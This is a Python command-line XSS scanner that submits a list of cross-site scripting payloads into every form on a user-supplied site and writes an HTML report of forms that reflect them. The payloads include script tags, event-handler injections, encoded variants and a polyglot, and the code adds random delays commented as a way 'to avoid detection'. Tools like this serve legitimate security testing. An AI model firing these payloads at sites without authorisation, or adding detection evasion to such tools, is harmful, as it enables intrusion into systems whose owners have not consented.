import requests
from bs4 import BeautifulSoup
import urllib.parse
import time
import random
import datetime
import os
import sys
from pyfiglet import Figlet
from termcolor import colored

def print_colorful_ascii_art(text, font='slant', color='red'):
    try:
        f = Figlet(font=font)
        ascii_art = f.renderText(text)
        colored_ascii_art = colored(ascii_art, color)
        print(colored_ascii_art)
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def generate_html_report(url, vulnerable_forms):
    report = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>XSS Vulnerability Scan Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; }}
            h1, h2 {{ color: #2c3e50; }}
            .vulnerability {{ background-color: #f9f9f9; border: 1px solid #ddd; padding: 15px; margin-bottom: 20px; border-radius: 5px; }}
            .vulnerability h3 {{ color: #e74c3c; }}
            .impact {{ background-color: #ecf0f1; padding: 10px; border-radius: 5px; }}
            .impact h4 {{ color: #2980b9; }}
        </style>
    </head>
    <body>
        <h1>XSS Vulnerability Scan Report</h1>
        <p><strong>Target URL:</strong> {url}</p>
        <p><strong>Scan Date:</strong> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <h2>Scan Results</h2>
    """

    if vulnerable_forms:
        for i, vuln in enumerate(vulnerable_forms, 1):
            report += f"""
            <div class="vulnerability">
                <h3>Vulnerability #{i}</h3>
                <p><strong>Form Action:</strong> {vuln['form'].get('action', '')}</p>
                <p><strong>Method:</strong> {vuln['form'].get('method', 'get')}</p>
                <p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>
                <p><strong>URL:</strong> {vuln['url']}</p>
                
                <div class="impact">
                    <h4>Potential Impact:</h4>
                    <p>This XSS vulnerability, in the hands of an attacker, could be used to:</p>
                    <ul>
                        <li>Steal user session cookies, potentially hijacking user accounts</li>
                        <li>Deface the website or manipulate its content</li>
                        <li>Redirect users to malicious websites</li>
                        <li>Capture keystrokes, potentially exposing sensitive user information</li>
                        <li>Perform actions on behalf of the user without their knowledge</li>
                        <li>Install keyloggers or other malicious scripts</li>
                        <li>Exploit the user's browser vulnerabilities</li>
                    </ul>
                </div>
            </div>
            """
    else:
        report += "<p>No XSS vulnerabilities were detected in the scanned forms.</p>"

    report += """
        <h2>Disclaimer</h2>
        <p>This report is generated by an automated tool and may include false positives or miss certain vulnerabilities. A thorough security audit should include manual verification and additional testing methodologies.</p>
    </body>
    </html>
    """

    return report

def scan_for_xss(url):
    print("Starting XSS vulnerability scan...")
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onchange=alert('XSS')><option>1</option><option>2</option></select>",
        "\" onmouseover=\"alert('XSS')\"",
        "' onfocus='alert('XSS')' autofocus='",
        "\";alert('XSS');//",
        "'-alert('XSS')-'",
        "javascript:alert('XSS')",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        "#<img src=/ onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body/onload=alert('XSS')>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
        "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e"
    ]
    
    vulnerable_forms = []
    
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        total_forms = len(forms)
        for i, form in enumerate(forms):
            progress = (i + 1) / total_forms * 100
            print(f"Scanning progress: {progress:.0f}%")
            
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            for payload in payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        data[input_name] = payload
                
                if method == 'get':
                    full_url = urllib.parse.urljoin(url, action) + '?' + urllib.parse.urlencode(data)
                    test_response = requests.get(full_url)
                else:
                    full_url = urllib.parse.urljoin(url, action)
                    test_response = requests.post(full_url, data=data)
                
                if payload in test_response.text:
                    vulnerable_forms.append({
                        'form': form,
                        'payload': payload,
                        'url': full_url
                    })
                    break
            
            time.sleep(random.uniform(0.1, 0.3))  # Random delay to avoid detection
        
        print("Scan complete. Generating report...")
        report_html = generate_html_report(url, vulnerable_forms)
        
        # Save the report
        report_filename = f"xss_scan_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(report_html)
        
        print(f"Report saved as {report_filename}")
        
        if vulnerable_forms:
            print(f"\nVulnerabilities found. Please check the HTML report for details: {report_filename}")
        else:
            print("\nNo XSS vulnerabilities detected in the scanned forms. See the HTML report for confirmation.")
    
    except Exception as e:
        print(f"An error occurred during the scan: {str(e)}")

if __name__ == "__main__":
    print_colorful_ascii_art("XSS", color='red')
    print_colorful_ascii_art("LESTAZ", color='green')
    print_colorful_ascii_art("SCANNER", color='blue')
    print("Build by Lestaz")
    print("Please give a star and a follow at github.com/lawrencerichardagaga")
    
    target_url = input("Enter the target website URL to scan: ")
    scan_for_xss(target_url)
